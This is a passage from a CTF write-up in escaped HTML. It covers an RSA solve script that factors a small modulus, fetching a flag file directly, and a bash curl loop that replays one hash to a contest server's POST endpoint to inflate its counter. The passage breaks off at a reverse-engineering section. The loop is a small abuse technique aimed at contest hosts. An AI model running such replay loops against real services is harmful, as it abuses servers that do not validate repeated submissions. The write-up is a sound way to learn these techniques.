encryption. Interesting.\u003C/p>\n\u003Cp>Since the factors are all small, we can just go to factorDB and get the factors using the composite number \u003Ccode>n\u003C/code>. We then can create a private key that will decrypt the encrypted \u003Ccode>enc\u003C/code>\u003C/p>\n\u003Cp>Here’s the solve script:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> inverse\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> m\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  a\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> b\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> u \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> m\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  while\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> x \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">>\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    q \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> b \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">//\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> x\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> a\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> b\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> u \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> b \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">%\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> u\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> a \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">-\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> q \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> u\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> b \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> a \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">%\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> m\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">e \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 65537\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">enc \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">p \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 9953162929836910171\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">q \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 11771834931016130837\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">r \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 12109985960354612149\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">s \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 13079524394617385153\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">a \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 17129880600534041513\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">factors \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> [\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">9953162929836910171\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 11771834931016130837\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 12109985960354612149\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 13079524394617385153\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 17129880600534041513\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">phi \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> p \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> factors\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    phi \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (p \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">-\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">d \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> inverse\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">e\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> phi\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">M \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> bytes\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">fromhex\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">hex\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">pow\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">enc\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> d\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">n\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">:\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">).\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">decode\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">M\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">https://ctftime.org/writeup/21831\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"web-exploitatoin\">Web Exploitatoin\u003C/h2>\n\u003Ch4 id=\"bad-worker\">Bad Worker\u003C/h4>\n\u003Cblockquote>\n\u003Cp>オフラインで動くウェブアプリをつくりました。 We created a web application that works offline. \u003Ca href=\"https://web-bad-worker-lz56g6.wanictf.org\">https://web-bad-worker-lz56g6.wanictf.org\u003C/a>\u003C/p>\n\u003C/blockquote>\n\u003Cp>This one was kind of confusing. Looking into the web app, we can see that theres a route that will fetch \u003Ccode>flag.txt\u003C/code>\u003C/p>\n\u003Cp>However, when we try to interact by requesting it in the web server we get nothing! Even downloading the web app offline doesn’t do anything!\u003C/p>\n\u003Cp>However, you can just try to request the file \u003Ccode>flag.txt\u003C/code> yourself, which does yield the flag.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">wget\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> https://web-bad-worker-lz56g6.wanictf.org/FLAG.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"pow\">pow\u003C/h4>\n\u003Cblockquote>\n\u003Cp>compute hash to get your flag\nハッシュを計算してフラグを取ろう\u003C/p>\n\u003C/blockquote>\n\u003Cp>Upon visiting the website, we can see that hashes are being ‘computed’, but we need 1,000,000 to get the flag.\u003C/p>\n\u003Cp>IN NO WAY ON EARTH I AM WAITING TO COMPUTE 1000000 HASHES. LET’S GET LAZY.\u003C/p>\n\u003Cp>So the hashes computed is sent as a post request, but you can intentionally send the same hash and it counts as a hash, increasing the computed hash count.\u003C/p>\n\u003Cp>So what we can do is repeatedly send the same hash to the server until 1000000 hashes are computed. My solve script was really messy, but it did the job.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#!\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">/bin/bash\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Define the URL for the curl request\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Number of times to repeat the curl request\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">REPEAT_TIMES\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">1000000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Loop to repeat curl request\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (( \u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">i\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">;\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> i\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">&#x3C;=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">$REPEAT_TIMES\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">;\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> i\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">++\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> ))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">do\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Perform curl request (adjust options as needed)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    curl\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">https://web-pow-lz56g6.wanictf.org/api/pow\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -X\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> POST\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Accept: */*\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Accept-Language: en-US,en;q=0.5\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Accept-Encoding: gzip, deflate, br, zstd\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Referer: https://web-pow-lz56g6.wanictf.org/\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Origin: https://web-pow-lz56g6.wanictf.org\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Connection: keep-alive\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Cookie: pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJjYmNlZGI1OS1iOGQ1LTRkYmMtOGYyZC1iNTAyOWY3NzI1MzUifQ.yKnE98ZeLTmQ7YRgZkRUkk2bocPV8eurrm8gTgxRg6M\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Sec-Fetch-Dest: empty\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Sec-Fetch-Mode: no-cors\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Sec-Fetch-Site: same-origin\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">TE: trailers\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Content-Type: application/json\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Alt-Used: web-pow-lz56g6.wanictf.org\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Priority: u=4\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Pragma: no-cache\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -H\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Cache-Control: no-cache\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> --data-raw\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> '\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">[\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\", ...]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> sleep 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">done\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"reverse-engineering\">Reverse Engineering\u003C/h2>\n\u003Ch4 id=\"lambda\">lambda\u003C/h4>\n\u003Cblockquote>\n\u003Cp>Let’s dance with lambda!\u003C/p>\n\u003C/blockquote>\n\u003Cp>Let’s look at the source code we have to decrypt.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan 